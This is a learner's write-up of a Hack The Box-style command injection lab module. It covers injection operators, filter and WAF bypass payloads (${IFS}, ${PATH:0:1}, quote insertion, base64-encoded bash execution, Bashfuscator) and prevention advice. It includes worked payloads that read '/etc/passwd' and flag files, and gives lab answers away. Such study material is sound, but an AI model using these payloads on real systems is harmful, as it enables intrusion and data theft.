# Intro

## Intro to Command Injections

Command injection is when user input is taken and not sanatized, then used as part of a command on the server. This allows for a potentially breaking out of the confines of that command and running un-expected and potentially harmful commands on the server.

There are lots of examples of command injection, SQL Injection, Code Injection, OS Command Injection, etc. This is currently number 3 on OWASP top 10 Web App Risks.

# Exploitations

## Detection

To detect command injection, we would do the same thing we would do if we were planning to exploit command injection. We simply attempt to append a command using various injection methods. If the output is something other than normal, then we succesfully exploited the command injection vulnerability. For more advancecd injections we might use Fuzzing to do this. Or use code review. But in general that is the process.

For command injection there are a few characters that help us:

Injection Operator  |	Injection Character |	URL-Encoded Character |	Executed Command                           |
-----------------   |   ------------------  |   --------------------- | ----------------                           |
Semicolon 	    |	; 		    |	%3b 		      |	Both                                       |
New Line 	    |	\n 		    |	%0a 		      |	Both                                       |
Background 	    |	& 		    |	%26 		      |	Both (second output generally shown first) |
Pipe 		    |	| 		    |	%7c 		      |	Both (only second output is shown)         |
AND 		    |	&& 		    |	%26%26 		      |	Both (only if first succeeds)              |
OR 		    |	|| 		    |	%7c%7c 		      |	Second (only if first fails)               |
Sub-Shell 	    |	`` 		    |	%60%60 		      |	Both (Linux-only)                          |
Sub-Shell 	    |	$() 		    |	%24%28%29 	      |	Both (Linux-only)                          |


## Injecting Commands

This webapp doesn't allow for direct injection of a command, but if you look at the network in the dev tools, you notice there are no web requests made. So it is very possible this command validation is all happening on the front end. Front end validation is very easily bypassable by sending web requests directly from something like Zap or Burp.

All we have to do is start the request interceptor on one of these, and try to send the request, then modifying the post to include our command. The response should contain the output of the other command if it is vulnerable.

The question in this section is:
Review the HTML source code of the page to find where the front-end input validation is happening. On which line number is it? 

Once you open the source code you see that on input field there is a patter expected.

## Other Injection Operators

We can use the other injection operators listed in the table above to do the same thing. The main take away of these are that || and | are maybe the best for clean output because they don't require the original output to come out. But they rely on the first command failing. So we would need to send a failing command || our new command. Like `ping -c 1 || whoami`

The question in this section is:
Try using the remaining three injection operators (new-line, &, |), and see how each works and how the output differs. Which of them only shows the output of the injected command? 

The answer is |

# Filter Evasion

## Identifying Filters

Some web applications use a blacklist of characters that cannot be used (though realistically it would likely be a whitelist). If a character or command is blacklisted, it could indicate a WAF or just backend validation.

We can test where the blacklist happens by going character by character until we get the fail message. It appears the ; is blacklisted. 

The question in this section is:
Try all other injection operators to see if any of them is not blacklisted. Which of (new-line, &, |) is not blacklisted by the web application? 

I literally got a bunch of these to work? Apparently the answer was new-line written like that. But the or operator definitly worked too. This was frustrating because it gave no hint as to how they wanted the input so I kept doing \n or its encoded form. 

## Bypassing Space Filters

Space is a commonly blacklisted character. Especially when we know the input should not have it. However, the newline character is frequently not blacklisted as the payload itself might need it.

To bypass the space filter, we can attempt to use tabs instead `%09` tabs and spsaces are treated the same in linux and windows. So commands will still run.

We can also try to use ${IFS} which defaults to a space and a tab in Linux.
Like: `127.0.0.1%0a${IFS}`

Or we can try Bash Brace Expansion which automatically adds spaces between arguments. 
Like: `127.0.0.1%0a{ls,-la}`

We can visit PayloadAllTheThings `https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#bypass-without-space` for other potential options.

The question in this section is:
Use what you learned in this section to execute the command 'ls -la'. What is the size of the 'index.php' file?

Running `ip=127.0.0.1%0a%09ls%09-la` gets the answer.

## Bypassing Other Blacklisted Characters

Most of the time the / and \ characters are going to be part of the blacklist because they are used in directory traversal. However, we can use environment variables to achieve the same result. 

For instance we can use ${PATH} to get all the path variables on a linue box. Then we can do something like ${PATH:0:1} to get just the first character on the path. Which is likely /

We can do the same thing with $HOME or $PWD.

For the semicolon, we could use something like ${LS_COLORS:10:1} to get that.

We can use `printenv` to see all the environment variables and see what we can use to our advantage.

On windows command line we can use something like `%HOMEPATH:~6,-11%` to get the \ character

And in powershell since environment variables are arrays all we have to do is 
``` Powershell
$env:HOMEPATH[0]
``` 
to get a character

Similar to Linux we can get all environment variable using `Get-ChildItem Env:`

We can also use character shifting to achieve the same result. 
We can use this command `$(tr '!-}' '"-~'<<<[)` to shift a character by one. So we could find the character right before the one we want and then shift it over. 

This is for linux, its much harder on Windows.

The question in this section is:
Use what you learned in this section to find name of the user in the '/home' folder. What user did you find? 

I first ran `127.0.0.1%0a%09printenv` to get the environment variables, then I ran: `127.0.0.1%0a%09ls%09${PATH:0:1}home` to get the answer

## Bypassing Blacklisted Commands

If there is a command blacklist, we can attempt to bypass this by adding specific characters in our strings that don't affect the integrity of the command. 

In both Linux and Windows we can use quotes (single or double) anywhere in a command and it will work the same way, as long as there are an even number of them.

So running wh"oam"i is the same as whoami.

In Linux, we can also use \ and $@ anywhere in the string, and it can be any number and not affect the integrity.

In Windows we can use ^ and the same is true.

The question in this section is:
Use what you learned in this section find the content of flag.txt in the home folder of the user you previously found.

Last time we used `127.0.0.1%0a%09ls%09${PATH:0:1}home` to get the answer.
So I tried `127.0.0.1%0a%09"l"s%09${PATH:0:1}home`

This showed the same folder. So running `127.0.0.1%0a%09"l"s%09-al%09${PATH:0:1}home${PATH:0:1}1nj3c70r` finds there is a flag.txt.in that directory.

Then running `127.0.0.1%0a%09'c'at%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt` gets the answer.

## Advanced Command Obfuscation

Advanced command obfuscation covers a lot of techniques we can use to potentially bypass a WAF. 

First we can try to use case manipulation (e.g. WhOaMi). In Windows this works as is because Powershell and CMD are case agnostic. However in Linux we would need to write a command that converts those characters back to lower case before it works. 

That could look like: `$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")` except this would not work in our case because it has space characters in it. So for our request we could use something like:
`127.0.0.1%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")` and that would work.

There are other options for converting the characters, this is just one example.

Another option we can try is to reverse the command then re-reverse it before execution.

For instance if we ran `127.0.0.1%0a$(rev<<<'imaohw')` would work just like running whoami

In windows we can do the same thing using `iex "$('imaohw'[-1..-20] -join '')"`, iex runs a reversed command.

Finally we can attempt to encode our commands before sending to the server then decode.

For instance we can encode a command like this `echo -n 'cat /etc/passwd | grep 33' | base64`

Then pass it to the server like this: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)`

We are using <<< instead of | because the pipe is filtered.

Even if some commands were filtered, like bash or base64, we could bypass that filter with the techniques we discussed in the previous section (e.g., character insertion), or use other alternatives like sh for command execution and openssl for b64 decoding, or xxd for hex decoding.

We can do the same thing in Windows like:
`[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))`

Then we can decode like:
`iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"`

There are also tools that we can use to automatically obfuscate our commands, we see those in the next section.

The question for this section is:
Find the output of the following command using one of the techniques you learned in this section: find /usr/share/ | grep root | grep mysql | tail -n 1 

So the first thing I did was convert it to base64 like:
`echo -n 'find /usr/share/ | grep root | grep mysql | tail -n 1' | base64`

That string was ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

Then I passed `bash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)` to the input like:
`ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)`

This got the answer.

## Evasion tools

One Linux tool we can use for obfuscation is Bashfuscator. We clone the tool here:
`https://github.com/Bashfuscator/Bashfuscator`

Then we can `
run pip3 install setuptools==65
python3 setup.py install --user
`

Then we can run the command like `./bashfuscator -c 'cat /etc/passwd'` this will run the command with a random obfuscation technique.

However, this can cause the command output to be over a million characters. So we can add some other flags to make this better.

`./bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1`

For windows we can use D)Sfuscation, which can be found here: `https://github.com/danielbohannon/Invoke-DOSfuscation`

To run this we can do: 
``` Powershell
PS C:\htb> git clone https://github.com/danielbohannon/Invoke-DOSfuscation.git
PS C:\htb> cd Invoke-DOSfuscation
PS C:\htb> Import-Module .\Invoke-DOSfuscation.psd1
PS C:\htb> Invoke-DOSfuscation
```

# Prevention

## Command Injection Prevention

First we should always try to use built in functions that perform the functionality we want and system commands, as many back-end languages have this in a way that is not exploitable. For instance instead of ping, we can use fsockopen in php.

If we cannot do that, we should never directly use user input to perform functionality. It should be sanatized on the backend and should be run with the least priviliges possible.

Regardless of how we are running the code we should always validate and sanatize input.

Validate means to make sure its in the expected format.

Sanatize means to remove potentially dangerous characters.

Sanatization should always happen after validation.

Finally, we should make sure our server is configured correctly to minimize impact of a compromized server.

# Skills Assessment

## Skills Assessment

I found this skills assessment to be very difficult. The hardest part was definitly finding where the exploit was. The first thing I did was go to the website and test all the buttons and look at the requests.

When looking at the requests, you quickly find a POST request with AJAX in it. But this is a read herring and not what we want. Then, after pressing some buttons we find a page that uses the mv command in linux.

I assumed this is where the exploit was, but I ran into a wall figuring out how to exploit it. Then, after a while I looked at the passed in paramters in Get request and noticed there was a from and a to parameter.

The way mv works is like `mv [From] [To]`, so we can assume the to parameter is the end of the passed in command. Which means this is likely the place the injection works. However, I still was having issues getting the command to work. Everytime I ran it I got an error. But this actually was the trick, as we want this error to happen. We can utilize the || command to get this call another command. But it needs to be encoded like %7c%7c.

Then we can use the base64 encoding like we did in the previous section to find the flag. The easiest way to do this is to encode cat /flag.txt like `echo 'cat /flag.txt' | base64`.

Then we can pass this to the paramter like `%7c%7cbash<<<$(base64%09-d<<<Y2F0IC9mbGFnLnR4dAo=)`

Notice in this that we also had to encode the space character before -d with `%09`. This outputs the answer below the error text.

Overall, an interesting skill assessment, though I spent a fair bit of time on it.
